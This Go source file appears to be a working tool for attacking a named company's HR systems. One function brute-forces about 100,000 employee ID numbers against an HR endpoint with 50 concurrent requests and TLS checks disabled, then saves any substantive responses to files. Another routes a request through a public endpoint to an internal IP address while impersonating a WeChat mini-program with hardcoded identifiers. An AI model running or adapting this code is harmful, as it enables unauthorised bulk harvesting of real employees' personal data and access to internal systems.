package algorithm

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path"
	"sync"
)

// 最大并发数控制
const maxConcurrency = 50

// 请求函数
func fetchURL(wg *sync.WaitGroup, url string, sem chan struct{}, filename string) {
	defer wg.Done()

	// 控制并发数量
	sem <- struct{}{}
	defer func() { <-sem }()
	// Define the request body (empty JSON data)
	jsonData := []byte(`{}`)
	lastSegment := path.Base(url)
	filename_id := filename + "_id.txt"
	filename_body := filename + "_body.txt"
	// Create a new HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error creating request:", err)
	}

	// Set headers
	req.Header.Set("Host", "it.ofilm.com")
	req.Header.Set("Content-Type", "application/json")

	// Skip HTTPS certificate verification (insecure)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[!] 请求失败: %s - %s\n", url, err)
		return
	}
	defer resp.Body.Close()

	// 检查状态码并处理响应
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 && len(body) > 100 {
		fmt.Printf("[+] 有效 URL: %s\n", url)
		saveToFile(filename_id, lastSegment+"\n")
		saveToFile(filename_body, fmt.Sprintf("Response: %s\n", string(body)))
	}
}

// 将内容追加写入文件
func saveToFile(filename, data string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("[!] 文件写入失败:", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(data); err != nil {
		fmt.Println("[!] 写入文件错误:", err)
	}
}

func IworkGet() error {
	var wg sync.WaitGroup
	sem := make(chan struct{}, maxConcurrency) // 控制最大并发数

	// 扫描范围1: NF0000 - NF4000
	for i := 3260; i <= 3270; i++ {
		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/NF%04d", i)
		wg.Add(1)
		filename := "NF0000-NF4000.txt"
		go fetchURL(&wg, url, sem, filename)
	}

	// 扫描范围2: N00000 - N99999
	for i := 0; i <= 99999; i++ {
		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/N%05d", i)
		wg.Add(1)
		filename := "N00000-N99999.txt"
		go fetchURL(&wg, url, sem, filename)
	}

	wg.Wait() // 等待所有 goroutine 完成
	fmt.Println("[*] 扫描完成")
	return nil
}

func IworkSent(user string) error {

	// Define the request URL
	url := "https://it.ofilm.com/hr/hr-ks//rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/" + user

	// Define the request body (empty JSON data)
	jsonData := []byte(`{}`)

	// Create a new HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return nil
	}

	// Set headers
	req.Header.Set("Host", "it.ofilm.com")
	req.Header.Set("Content-Type", "application/json")

	// Skip HTTPS certificate verification (insecure)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return nil
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return nil
	}

	// Print the response status and body
	fmt.Printf("Status Code: %d\n", resp.StatusCode)
	fmt.Printf("Response Body: %s\n", body)
	return nil
}

func IworkRencai(name string) error {
	url := "https://bmxy.ofilm.com/rest/zf/zf/get"

	// 构建 POST 请求体 JSON
	payload := map[string]interface{}{
		"url":    "http://192.168.55.32:8892/rest/api/hrtl/selectSelfReturn",
		"empId":  "NF3266",
		"openId": "olZaE61bCD9kOYCIJTKKfMeQxgsM",
		"data": map[string]interface{}{
			"userNo": name,
			"id":     "20082",
		},
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("JSON 序列化失败: %w", err)
	}

	// 创建 POST 请求
	req, err := http.NewRequest("POST", url, bytes.NewReader(jsonData))
	if err != nil {
		return fmt.Errorf("创建请求失败: %w", err)
	}

	// 设置请求头（模拟微信小程序环境）
	req.Header.Set("Host", "bmxy.ofilm.com")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Xweb_xhr", "1")
	req.Header.Set("Openid", "olZaE61bCD9kOYCIJTKKfMeQxgsM")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf2540611) XWEB/14199")
	req.Header.Set("Referer", "https://servicewechat.com/wx7222634c083face7/211/page-frame.html")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Set("Priority", "u=1, i")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Dest", "empty")

	// 发起请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("发送请求失败: %w", err)
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("读取响应失败: %w", err)
	}

	fmt.Printf("响应状态码: %d\n响应体: %s\n", resp.StatusCode, body)
	return nil
}
